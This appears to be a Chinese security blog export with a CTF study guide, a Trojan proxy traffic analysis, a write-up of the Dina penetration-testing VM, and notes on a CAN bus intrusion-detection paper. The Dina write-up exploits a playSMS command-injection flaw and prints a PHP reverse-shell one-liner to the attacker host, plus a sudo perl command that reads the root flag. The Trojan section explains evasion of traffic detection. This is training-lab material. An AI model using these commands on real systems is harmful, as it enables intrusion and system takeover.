<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>hackthebox</tag>
        <tag>pwn</tag>
        <tag>arm</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF学习指南</title>
    <url>/2018/12/08/%E6%9D%82%E8%AE%B0/CTF%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>PWN,Reverse：偏重对汇编，逆向的理解，逆向更多要求对于各种代码的了解，会常见开发，注重算法的理解，数据结构和算法一定要学好；PWN要求对于计算机系统的了解，对于基础的数据结构-栈堆-以及Linux/widows下的程序调用比较熟悉。</p>
<p>crypto：偏重对数学，算法的深入学习，同时也需要对常见密码有所了解-AES/DES等；</p>
<p>Web：需要对各种web漏洞了解，明白其形成原因和利用方式；了解计算机网络、网站搭建、会用常见的网站框架，同时需要大量的练习；</p>
<p>Misc：则更为复杂，所有与计算机安全挑战有关的都算在其中，所学很杂，积累和刷题很重要，常见有流量分析/隐写等；</p>
<p>Mobile:安卓逆向，要去了解安卓的基本架构；</p>
<h2 id="常规做法"><a href="#常规做法" class="headerlink" title="常规做法"></a>常规做法</h2><p>　　A方向：PWN+Reverse+crypto,随机搭配；</p>
<p>　　B方向：Web+Misc组合；</p>
<h2 id="都要学的内容："><a href="#都要学的内容：" class="headerlink" title="都要学的内容："></a>都要学的内容：</h2><ul>
<li>Linux基础</li>
<li>计算机组成原理</li>
<li>操作系统原理</li>
<li>网络协议分析</li>
<li>数据结构</li>
<li>算法</li>
</ul>
<h2 id="A方向"><a href="#A方向" class="headerlink" title="A方向"></a>A方向</h2><p>　　　　IDA工具使用（f5插件），逆向工程，密码学，缓冲区溢出等</p>
<p>​         书籍推荐：</p>
<ul>
<li><p>《加密与解密（第四版）》；</p>
</li>
<li><p>《IDA Pro权威指南》；</p>
</li>
<li><p>《逆向工程权威指南》（字典工具书）；</p>
</li>
<li><p>《自己动手写操作系统》；</p>
</li>
<li><p>《算法导论》</p>
</li>
<li><p>《汇编语言》</p>
</li>
<li><p>《黑客攻防宝典，系统实战篇》；</p>
</li>
<li><p>《程序员的自我修养—链接、装载与库》</p>
<p>网站推荐： </p>
<p>www.pediy.com</p>
<p>www.52pojie.cn</p>
<p>www.pwnable.kr</p>
<p>www.pwnable.tw</p>
</li>
</ul>
<h2 id="B方向"><a href="#B方向" class="headerlink" title="B方向"></a>B方向</h2><p>　　　　网络安全，内网渗透，数据库安全。</p>
<p>　　　　书籍推荐：</p>
<ul>
<li><p>《Web应用安全权威指南》</p>
</li>
<li><p>《web前端黑客技术揭秘》</p>
</li>
<li><p>《黑客秘籍-渗透测试实用指南》</p>
</li>
<li><p>《黑客攻防技术宝典Web实战篇》</p>
</li>
<li><p>《代码审计：企业级Web代码安全架构》</p>
</li>
<li><p>《SQL注入攻击与防御》</p>
<p>网站推荐：</p>
<p><a href="http://www.dvwa.co.uk/">dvwa本地靶场</a>（自己在本地搭建）</p>
<p><a href="https://github.com/Audi-1/sqli-labs">SQLilab本地靶场</a>（自己在本地搭建）</p>
<p><a href="https://pan.baidu.com/s/1eRIB3Se">webug</a>（本地搭建）</p>
<p><a href="http://hackinglab.cn/">http://hackinglab.cn/</a></p>
<p><a href="http://www.gameofhacks.com/">http://www.gameofhacks.com/</a></p>
<p><a href="http://1111.segmentfault.com/">http://1111.segmentfault.com/</a> 光棍节程序员闯关秀</p>
<p><a href="http://monyer.com/game/game1/">http://monyer.com/game/game1/</a>梦之光芒的小游戏</p>
<p><a href="http://www.fj543.com/hack/">http://www.fj543.com/hack/</a> 黑客丛林之旅</p>
<p><a href="http://hackgame.blackbap.org/">http://hackgame.blackbap.org/</a> 习科黑客游戏</p>
<p><a href="http://www.helloisa.com/test/">http://www.helloisa.com/test/</a> ISA闯关游戏</p>
<p><a href="http://hkyx.myhack58.com/">http://hkyx.myhack58.com/</a> 红客闯关游戏</p>
<p><a href="http://hackit.sinaapp.com/">http://hackit.sinaapp.com/</a> hackit游戏</p>
</li>
</ul>
<h2 id="CTF综合平台"><a href="#CTF综合平台" class="headerlink" title="CTF综合平台"></a>CTF综合平台</h2><p>学校自己的系统（10.222.2.235/10.222.2.236）</p>
<p><a href="http://www.ichunqiu.com/">http://www.ichunqiu.com/</a>  i春秋</p>
<p><a href="http://www.shiyanbar.com">http://www.shiyanbar.com</a> 实验吧</p>
<p><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a> bugku平台</p>
<p><a href="http://oj.xctf.org.cn/">http://oj.xctf.org.cn/</a> XCTF_OJ练习平台 （自己去找吧）</p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>　　CTF比赛一般都是使用网络完全常用工具，比如burp、IDA等，但是会与很多大家不常见的工具：</p>
<p>　　　　<a href="https://hithub.com/truongkma/ctf-tools">https://hithub.com/truongkma/ctf-tools</a></p>
<p>　　　　<a href="https://tool.bugku.com/">https://tool.bugku.com/</a></p>
<h2 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h2><ul>
<li>​        <a href="https://ctftime.org/国际比赛">https://ctftime.org/国际比赛</a></li>
<li>​        <a href="http://www.xctf.org.cn/国内比赛">http://www.xctf.org.cn/国内比赛</a></li>
<li>​        <a href="http://www.ichunqiu.com/">http://www.ichunqiu.com/</a>  i春秋（赛宁）</li>
</ul>
<p>【注】：</p>
<p>1、writeup指CTF比赛结题思路</p>
<h1 id="信心比黄金更重要"><a href="#信心比黄金更重要" class="headerlink" title="信心比黄金更重要"></a><strong>信心比黄金更重要</strong></h1><p>禁止转载！！！</p>
]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>Trojan流量分析</title>
    <url>/2020/02/18/%E6%9D%82%E8%AE%B0/Trojan%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h2><p><img src="https://img-blog.csdnimg.cn/20200218223743627.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JsYXRlb3I=,size_16,color_FFFFFF,t_70" alt="Trojan原理"><br>如图所示，Trojan工作在443端口，处理来自外界的HTTPS请求，如果是合法的Trojan请求，那么为该请求提供服务，否则就将该流量转发给web。服务器Nginx，由Nginx为其提供服务。基于这个工作工程可以知道，Trojan的一切表现均与Nginx一致，不会引入额外特征，从而达到无法识别的效果。当然，为了防止恶意探测，我们需要将80端口的流量全部重定向到443端口，并且服务器只暴露80和443端口，这样可以使得服务器与常见的Web服务器表现一致。</p>
<p>当Trojan客户端连接到服务器时，它首先执行真正的TLS握手。如果握手成功，则所有后续流量都将受到TLS的保护；</p>
<h2 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h2><p><strong>本机IP</strong>: 192.168.31.176</p>
<p><strong>服务器IP</strong>: 91.220.202.97<br><img src="https://img-blog.csdnimg.cn/20200218224249153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JsYXRlb3I=,size_16,color_FFFFFF,t_70" alt="TCP与TLS握手"><br>TCP握手包序号：73，74，75</p>
<p>TLS握手：76，77，78，79，80，81，82，83</p>
<p>然后，客户端发送以下结构（TLS加密之后的）：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>hex(SHA224(password))</th>
<th>CRLF</th>
<th>Trojan Request</th>
<th>CRLF</th>
<th>Payload</th>
</tr>
</thead>
<tbody>
<tr>
<td>56</td>
<td>X’0D0A’</td>
<td>Variable</td>
<td>X’0D0A’</td>
<td>Variable</td>
</tr>
</tbody>
</table>
</div>
<p>当Trojan 请求是类似于如下SOCKS5的请求：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">+-----+</span>------<span class="code">+----------+</span>----------+</span><br><span class="line"><span class="section">| CMD | ATYP | DST.ADDR | DST.PORT |</span></span><br><span class="line"><span class="section">+-----+------+----------+----------+</span></span><br><span class="line"><span class="section">|  1  |  1   | Variable |    2     |</span></span><br><span class="line"><span class="section">+-----+------+----------+----------+</span></span><br><span class="line"></span><br><span class="line">o  CMD</span><br><span class="line"><span class="code">        o  CONNECT X&#x27;01&#x27;</span></span><br><span class="line"><span class="code">        o  UDP ：X&#x27;03&#x27;</span></span><br><span class="line">o  ATYP </span><br><span class="line"><span class="code">        o  IP V4 : X&#x27;01&#x27;</span></span><br><span class="line"><span class="code">        o  域名: X&#x27;03&#x27;</span></span><br><span class="line"><span class="code">        o  IP V6 : X&#x27;04&#x27;</span></span><br><span class="line">o  DST.ADDR 所需的目标地址</span><br><span class="line">o  DST.PORT 目标端口</span><br></pre></td></tr></table></figure>
<h2 id="UDP模式"><a href="#UDP模式" class="headerlink" title="UDP模式"></a>UDP模式</h2><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">+------+</span>----------<span class="code">+----------+</span>--------<span class="code">+---------+</span>----------+</span><br><span class="line"><span class="section">| ATYP | DST.ADDR | DST.PORT | Length |  CRLF   | Payload  |</span></span><br><span class="line"><span class="section">+------+----------+----------+--------+---------+----------+</span></span><br><span class="line"><span class="section">|  1   | Variable |    2     |   2    | X&#x27;0D0A&#x27; | Variable |</span></span><br><span class="line"><span class="section">+------+----------+----------+--------+---------+----------+</span></span><br></pre></td></tr></table></figure>
<p>服务器收到第一个数据包时，将检查哈希密码是否正确以及Trojan请求是否有效。如果不是，则将该协议视为非Trojan请求。</p>
<p>请注意，第一个数据包将附加有效负载。这避免了长度模式检测，并可能减少要发送的数据包数量。</p>
<p>如果请求有效，则Trojan服务器将连接到DST.ADDR和DST.PORT字段指示的目标服务器，并在服务器和Trojan客户端之间打开通道。</p>
<p>因为通常将Trojan服务器假定为HTTPS服务器，所以侦听套接字始终是TLS套接字。在执行TLS握手之后，如果Trojan服务器确定流量为非Trojan协议，则会在服务器端点（默认为本地HTTP服务器127.0.0.1:80）到客户端之间打开一条连接，因此服务器端点控制解密的TLS流量。</p>
<p>所有没有正确结构和密码的连接都将重定向到预设的网址，因此，如果连接了链接，则Trojan服务器的行为与该网址完全相同（默认为HTTP）。</p>
<h2 id="反检测"><a href="#反检测" class="headerlink" title="反检测"></a>反检测</h2><p>由于流量受TLS保护（使用有效证书是用户的责任），因此，如果您访问的是HTTP站点，则流量与HTTPS相同（TLS握手后只有一个RTT）；如果您不访问HTTP站点，则流量看起来与保持活动的HTTPS或WebSocket相同。因此，Trojan还可以绕过ISP QoS限制。</p>
<h2 id="Trojan标本"><a href="#Trojan标本" class="headerlink" title="Trojan标本"></a>Trojan标本</h2><h3 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h3><p><img src="https://img-blog.csdnimg.cn/20200218224715547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JsYXRlb3I=,size_16,color_FFFFFF,t_70" alt="包长度"></p>
<h3 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h3><p><img src="https://img-blog.csdnimg.cn/20200218224747459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JsYXRlb3I=,size_16,color_FFFFFF,t_70" alt="IP"><br><a href="https://xbsj7654.space/">实例</a></p>
<p>搭建方式：</p>
<p><a href="https://bk.shunleite.com/post-45.html">点击进入</a></p>
]]></content>
      <categories>
        <category>杂记</category>
      </categories>
  </entry>
  <entry>
    <title>Dina渗透</title>
    <url>/2018/12/08/%E6%B8%97%E9%80%8F/Dina%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>Dian是一台渗透测试用的虚拟环境，只是用于娱乐的主机，不过玩的还是挺开心的。写点笔记作为参考。使用的网络环境为NAT模式。<br><span id="more"></span></p>
<h2 id="发现目标主机"><a href="#发现目标主机" class="headerlink" title="发现目标主机"></a>发现目标主机</h2><p>利用扫描工具nmap扫描目标网段，寻找存活的目标主机。我的NAT模式网段在192.168.43.1这个网段上，可以用命令：</p>
<p><code>nmap 192.168.43.0/24</code></p>
<p>扫描目标端内所有的存活主机</p>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ截图20181128233231.png" alt=""></p>
<p>发现目标主机：<code>192.168.43.130</code></p>
<p>开放端口：<code>80</code></p>
<p>访问目标服务器<img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ截图20181203152020.png" alt=""></p>
<p>查看源代码什么的，发现没有什么入口什么的。可能需要寻找其他的入侵点。</p>
<h2 id="发现登录入口"><a href="#发现登录入口" class="headerlink" title="发现登录入口"></a>发现登录入口</h2><p>没事就看看robots.txt，没准就有惊喜。查看robots.txt。真的有惊喜！！！</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">User-agent</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/ange1</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/angel1</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/nothing</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/tmp</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/uploads</span><br></pre></td></tr></table></figure>
<p>这几个几个页面依次访问一下，除了<code>\nothing</code>这个页面，其他的都一个个文件夹，一度让我以为是文件上传，卡了很久。。。。。。头疼。后来想了一下，会不会还有什么页面没有出现，用<code>dirb</code>—kali下的一个扫描的软件—默认字典就够了。</p>
<p>发现页面：<code>http://192.168.43.130/secure/</code>，访问得到一个压缩包，打开需要密码，结合前面noting页面发现的几个密码，一个个尝试发现工作量也不是很大，或者使用zip2John爆破，可以发现密码为<code>freedom</code></p>
<p>nothing页面发现的密码：</p>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ截图20181206142134.png" alt=""></p>
<p>打开压缩包，提取文件，是一个后缀为MP3的文件，但是。。。我并不想听音乐，所以，先用strings命令查看一下有没有特殊的东西，有线索。。</p>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ截图20181206142626.png" alt=""></p>
<p>ok,发现新的页面，继续访问，是个登录页面，从压缩包中获取的文件得知，只有用户名，密码还是得一个个试。。。。测试过后得到：</p>
<p><code>username：touhid</code></p>
<p><code>password：diana</code></p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>登录，发现是一个playSMS的网站，上网找一下有没有漏洞，早exploit-DB上面发现一个远程命令执行，发现可以使用，具体漏洞：<a href="https://www.exploit-db.com/exploits/42044。查看可知漏洞的点在于电话簿用户信息的导入，具体利用方式在漏洞说明中很清楚。直接可以使用。">https://www.exploit-db.com/exploits/42044。查看可知漏洞的点在于电话簿用户信息的导入，具体利用方式在漏洞说明中很清楚。直接可以使用。</a></p>
<p>漏洞利用文件：</p>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ截图20181206143717.png" alt=""></p>
<p>上传，利用burpsuite抓包，由于执行的命令在USER_AGENT，所以修改http请求的USER_AGENT的内容为我们要执行的命令就可以了。</p>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ截图20181206144238.png" alt=""></p>
<p>结果：</p>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ截图20181206144245.png" alt=""></p>
<p>下一步就是反弹shell了，我的kali攻击机的IP地址为：192.168.43.129，所以把shell反弹到这就行了，监听kali 的8008端口：</p>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ截图20181206144851.png" alt=""></p>
<p>利用命令：</p>
<p><code>php -r &#39;$sock=fsockopen(&quot;192.168.43.129&quot;,8008);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p>
<p>getshell:</p>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ截图20181206145215.png" alt=""></p>
<p>成功进入主机！！！</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sudo perl -e <span class="symbol">&#x27;exec</span> <span class="string">&quot;cat /root/flag.txt&quot;</span>;&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ截图20181206145522.png" alt=""></p>
<p>hack it！！</p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>-总结</tag>
      </tags>
  </entry>
  <entry>
    <title>论文笔记_CAN总线安全检测</title>
    <url>/2021/06/25/%E8%AE%BA%E6%96%87/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0-CAN%E6%80%BB%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B/</url>
    <content><![CDATA[<h2 id="基于识别时间窗中的数据包定时异常检测汽车CAN网络攻击"><a href="#基于识别时间窗中的数据包定时异常检测汽车CAN网络攻击" class="headerlink" title="基于识别时间窗中的数据包定时异常检测汽车CAN网络攻击"></a>基于识别时间窗中的数据包定时异常检测汽车CAN网络攻击</h2><p><code>2018 48th Annual IEEE/IFIP International Conference on Dependable Systems and Networks Workshops</code></p>
<p> 本文主要介绍一定时间窗口内的CAN数据包的序列异常来识别网络攻击，提出了一种分析CAN广播和随后的测试统计方法来检测时间变化的CAN流量指示一些预测的攻击。检测是在时间定义的窗口中实现的。</p>
<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>CAN总线：CAN是控制器局域网络(Controller Area Network, CAN)的简称，是由以研发和生产汽车电子产品著称的德国BOSCH公司开发的，并最终成为国际标准（ISO 11898），是国际上应用最广泛的现场总线之一。 在北美和西欧，CAN总线协议已经成为汽车计算机控制系统和嵌入式工业控制局域网的标准总线，并且拥有以CAN为底层协议专为大型货车和重工机械车辆设计的J 1939协议。</p>
<ul>
<li><p>串行通信协议</p>
</li>
<li><p>通信速率最高可达 1Mbps</p>
</li>
<li><p>通信数据的成帧处理</p>
</li>
<li><p>网络内的节点个数理论上不受限制</p>
</li>
<li><p>各节点之间可以自由通信：多主竞争总线结构</p>
</li>
<li><p>结构简单</p>
</li>
</ul>
<p>没有消息确认、发送方身份验证、加密</p>
<p>存在的问题：</p>
<ol>
<li>注入包含恶意数据的CAN数据包：CAN Message InjectionOG Dynamite Edition</li>
<li>强制刷新ECU注入恶意代码：Experimental Security Analysis of a Modern Automobile</li>
</ol>
<p>CAN数据包：</p>
<p><img src="https://i.loli.net/2021/06/25/x41ceuHSkpTlInC.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/06/25/eucfztoVG4IrhDC.png" alt="img"></p>
<p>帧ID越小，优先级越高。由于数据帧的RTR位为显性电平，远程帧为隐性电平，所以帧格式和帧ID相同的情况下，数据帧优先于远程帧；由于标准帧的IDE位为显性电平，扩展帧的IDE位为隐形电平，对于前11位ID相同的标准帧和扩展帧，标准帧优先级比扩展帧高。</p>
<p><img src="https://i.loli.net/2021/06/25/tzDb91rMNOSnQg5.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/06/25/PH2Iouyb5LiSCkR.png" alt="img"></p>
<h3 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h3><p>IDS 入侵检测系统</p>
<p>开发一个CAN  IDS的挑战之一是，CAN消息是专有的，不同的汽车制造和型号均不相同。因此，虽然CAN协议公开发布，但消息标识符、数据含义和广播的时间并没有被制造商披露，而且不能假定在一系列汽车制造商和模型中是相似的。因此，一个可行的CAN  IDS需要易于配置，以适应如此广泛的范围。</p>
<p>CAN数据包是由ecu创建的，由包含CAN ID的仲裁字段和其他字段(包括数据字段)组成。CAN  id通常被认为是每个ecu的唯一标识，并被其他ecu用来决定数据包是否与它们相关。CAN仲裁过程定义了CAN  ID值越低，报文的优先级越高。如果多个ECU同时尝试广播报文，则广播CAN ID值最小的报文的ECU将成功。</p>
<p>CAN数据包，特别是那些更重要的数据包，通常以非常规则、频繁的周期、进行广播。因此，CAN  id重复出现的频率可以提供一种检测某些攻击的方法。这里关注的攻击模式(刷新和包注入)可能会强制临时改变相关CAN包、、的广播频率。在刷新攻击中，来自ECU的数据包在刷新时不会广播，从而导致相关CAN  id的暂时减少。在注入攻击中，某些CAN  id的广播频率会增加，因为攻击要求以足够高的速率广播虚假数据包，以淹没相关的合法广播。另外，CAN仲裁过程(CAN  ID值越低，广播优先级越高)可能会导致某些CAN ID的广播槽丢失给攻击中使用的优先级较高的占主导地位的CAN ID。</p>
<ul>
<li>重新刷新攻击：某些数据包不会出现，相关的CAN ID在一定时间窗口内不会出现</li>
<li><p>注入攻击： 某些数据包在一定的时间窗口内会出现高频率传输，攻击要求以足够高的速率广播虚假数据包，以淹没相关的合法广播</p>
<h3 id="时间窗口的方法"><a href="#时间窗口的方法" class="headerlink" title="时间窗口的方法"></a>时间窗口的方法</h3></li>
</ul>
<p>时间定义窗口方法将数据处理为离散窗口。将计算出的指标和随后的决策保持在窗口的本地，可以减少数据中反映的任何长期系统更改的影响。有一些窗口方法可以用于数据包定时异常检测。一种选择是处理窗口以获得度量，然后应用这些度量对下一个广播进行分类。窗口一次滑过一个广播的数据，在每个广播重新计算指标。</p>
<p>在本研究中，我们在离散的、不重叠的、连续的窗口中处理数据，其优点是减少度量的重新计算;在有限的CPU容量的车辆有利。在我们的研究中，对一个窗口的指标进行计算，然后应用到该窗口内的所有广播进行分类，然后评估下一个不重叠的窗口。与滑动窗口相比，这种方法减少了窗口指标需要重新计算的频率。根据窗口中的广播评估指标可以确保评估的广播在检测方法捕获的任何自然发生的调整的范围内。它还确保在旅程一开始就对异常情况进行评估。</p>
<p>我们将时间窗方法与两种无监督方法(z分数和自回归综合移动平均法)相结合;以及用监督方法(与平均广播间隔比较)进行比较。这些内容载于第四-  b节。使用z分数和基于时间的数据的ARIMA已被证明可以结合来自各种来源的数据，以评估复杂计算机网络受到攻击的可能性。尽管这些方法需要一个阈值分数来优化检测，但它们在适应数据集之间的方差和差异方面需要很少的监督，不需要训练干预。因此，它们可能提供有用的方法来检测CAN  ID广播频率的变化，考虑到CAN操作的未知和不同的汽车。</p>
<p><strong>z-score:</strong> Z-Score标准化是数据处理的一种常用方法。通过它能够将不同量级的数据转化为统一量度的Z-Score分值进行比较。</p>
<p>ARIMA： AutoRegressive Integrated Moving Average(差分自回归移动平均模型)</p>
<p>差分整合移动平均自回归模型，又称整合移动平均自回归模型（移动也可称作滑动），是时间序列预测分析方法之一</p>
<p>ARIMA里面的I指Integrated（差分）。 ARIMA（p,d,q）就表示p阶AR，d次差分，q阶MA。  为什么要进行差分呢？ ARIMA的前提是数据是stationary的，也就是说统计特性（mean，variance，correlation等）不会随着时间窗口的不同而变化。</p>
<h3 id="研究步骤"><a href="#研究步骤" class="headerlink" title="研究步骤"></a>研究步骤</h3><p>对一辆汽车进行初始CAN分析，以建立其CAN广播的速率和一致性，并建立监督检测方法中使用的阈值。</p>
<ol>
<li>数据捕获  Kvaser Leaf Light</li>
</ol>
<ol>
<li><p>播放率</p>
<p>55个CAN id被检测到，其中只有两个在整个旅程中被广播。在一段旅程开始时，两个id短暂出现，之后再没有被发现。这些被排除在随后的测试之外。</p>
<p>一般来说，优先级越高(即ID值越低)的CAN ID广播频率越高，时间变化越小。图1和图2显示了CAN  ID匹配数据包的每秒平均广播次数和广播间隔时间。由于广播频率和时间的模式是相似的旅程，只有一个旅程显示。大多数数据包的广播间隔是一致的。优先级越高的CAN  id的广播频率越高，有的广播速度约为每秒100个，而只有4个CAN id的广播速度小于每秒10个(图1)。</p>
<p>大多数CAN  ID的广播间隔变化都很小(图2)。除了一个ID外，其他所有ID的最大重复广播时差都小于0.1秒，其中39个ID(71%)的最大重复广播时差小于0.01秒。40个CAN  id的重复广播标准偏差小于0.0007秒，而除4个外，其他所有的标准偏差小于0.01秒。</p>
<p>总体而言，分析表明ecu在整个航程和每次航程中都以一致的、可预测的速度广播其信息。其他研究人员在分析其他汽车时注意到CAN信息广播的这种一致性。如果我们假设单个CAN  id是特定于单个ecu的，那么几乎所有广播ecu将以每秒10次或更多的频率广播，大多数广播以每秒100次以上的一致速度广播。</p>
<p>这种观察到的CAN识别广播的规律性，在不同的汽车制造和型号中显示出来，提出了这样一个问题，即广播的规律性是否足以使人们容易发现可能意味着攻击的变化，特别是在第二-  a节中概述的那些变化</p>
</li>
<li></li>
</ol>
<p>A.攻击仿真</p>
<p>通过系统地更新行程中的CAN日志副本，对每个CAN  ID进行攻击模拟。修改后的日志文件通过我们的检测算法进行处理。Taylor等人使用了类似的方法、Marchetti和Stabili，试图模拟Miller和Valasek[5][15]演示的真实攻击对CAN流量的影响。</p>
<p>捕获的日志以两种方式进行更改，以生成两个测试集:丢弃包和注入包。</p>
<p>述两种攻击类型中的任何一种都可能导致数据包丢失(参见第II-A节)。在一次刷新攻击中，被攻击ECU的固件被攻击向量覆盖，从而被适配的固件取代。关于广播计时的变化，ECU将错过广播，否则在刷新期间会发生。由于CAN仲裁过程导致的广播丢失的增加也可能是由注入攻击触发的，当一个更高优先级的携带恶意数据的ID被高速广播，以确保恶意数据的广播超过合法数据。因此，丢弃广播检测的目的是看看这些方法是否能够检测到数据包广播已经被跳过。</p>
<p>当被破坏或非法添加的ECU广播数据包模仿合法ECU的数据包时，可能会发生，从而广播错误的数据或错误的控制信号。这种攻击的另一种变体是拒绝服务攻击，在这种攻击中，数据包以快速的频率提交，以压倒总线。Miller和V  alasek[5]已经证明了CAN注入攻击。因此，注入攻击检测的目的是看看这些方法是否能够检测到插入了额外的数据包广播。</p>
<p>对于每次攻击，在整个日志期间随机选择时间点，在捕获的日志文件中创建20个攻击点。对于丢弃广播模拟，与被测试ID相关的数据包在随机分配的攻击点被移除一秒。对于注入检测，在随机选择的时间后的下一个可用间隙插入一个相关CAN  ID的广播到日志文件中，注入广播的时间戳集相应。</p>
<p>然后通过将日志按时间顺序提交给检测算法来评估日志，从而模拟生产执行中可能发生的现场广播的处理。</p>
<p>CAN数据流被处理为离散的、连续的固定时间的窗口，例如1秒。在完成每个窗口的广播后，将该窗口内特定CAN ID的平均广播间隔与该窗口内的每个CAN  ID广播进行比较。因此，对于窗口内的每个广播Biof CAN ID，从Bi−1开始计算时间间隔，并与窗口内的CAN  ID的平均值进行比较。比较方法说明如下。完成后，分析将移到下一个窗口。</p>
<p>B. 方法测试</p>
<p>比较三种检测方法：</p>
<ul>
<li>用于基于均方误差的广播间隔异常检测（无监督）的窗口的 ARIMA 模型。</li>
<li>每个广播间隔的 Z 分数与窗口平均值（无监督）进行比较。</li>
<li>广播时间间隔与窗口均值（监督）的比较。</li>
</ul>
<p>在这个窗口上下文中使用[21]和[22]中讨论的前两个方法时，可以认为是无监督的，因为在窗口和CAN  id之间的任何差异都会被缩放成相似的大小。这可以方便指定一个共同的阈值，而不需要根据不同汽车或情况的CAN行为差异进行调整。</p>
<p>第三种方法(广播间隔与窗口均值的比较)作为基线，用于与其他两种方法的比较。这种方法应该表现最好，因为它使用了一个根据一组训练数据行程的广播之间观察到的差异量身定制的阈值。上述分析建议测试阈值为0.003秒左右，我们的汽车制造和型号。</p>
<p>测试在R中实现，使用auto.Arima和scale()函数。auto。Arima函数设计用于快速、自动估计时间序列模型，两个函数都是参数化的，有助于高效的接口。</p>
<p>当数据包操作发生的窗口给出一个正标志时，检测被认为是True Positive (TP)。同样地，当在包含操作记录的窗口中没有检测到标记时，将认为是False Negative (FN)。相反，False Positive  (FP)表示给一个没有操作过数据包的窗口一个正标志，True Negative (TN)表示给这样一个窗口一个负标志。</p>
<p>对分类器性能的分析利用计算：</p>
<p>准确性是指正确分类的反应的比例：</p>
<script type="math/tex; mode=display">
\frac{TP+TN}{TP+FP+TN+FN}</script><p>敏感性(或回忆)是发现实际事件的能力:</p>
<script type="math/tex; mode=display">
\frac{TP}{TP+FN}</script><p>特异性是指测试对被评估的病情的特异性:</p>
<script type="math/tex; mode=display">
\frac{TN}{FP+TN}</script><p>准确性可能会产生误导，因为它掩盖了测试数据集中正元素和负元素的相对比例。如果底层测试集包含大量的否定实例，那么只做出否定响应的分类器可以获得很高的准确率。同样，对于只对包含大量肯定实例的数据集作出肯定响应的分类器也是如此。因此，敏感性和特异性也包括在结果分析中。</p>
<p>V 结果与讨论</p>
<p>测试比较了不同评分阈值(即z分数值、标准化ARIMA残差值和监督方法的绝对时差)下的检出率。这些方法最初是在只包含五个最高优先级CAN  id的样本上进行测试的。这些有最高的广播率，很少变化的时间(图1和2)。由于这些是最高优先级，很可能他们也会携带重要信息，使其成为高攻击目标。随后的分析包括了所有的CAN id，并观察了改变分析窗口大小的影响。</p>
<p>A. 高优先级CAN id的结果</p>
<p>表1列出了在对5个最高优先级ID进行分类时，这些方法在最高准确度级别上的得分</p>
<p>表I:调整阈值后，对于5个最高优先级的CAN id，三种方法在最高准确度点的得分</p>
<p>特异性评分和敏感性评分通常在这些准确性上都很高，反映了一个强大的能力，以避免假阴性，并捕捉大多数攻击。然而，在注入模拟中，ARIMA的灵敏度较低，表明其检测单记录注入的能力在这些点上是最弱的。在最高准确度点，ARIMA方法检测了100个注射剂中的93个(灵敏度为0.9300)，并正确分类了8845个非注射窗口中的8844个(特异性为0.9999)。</p>
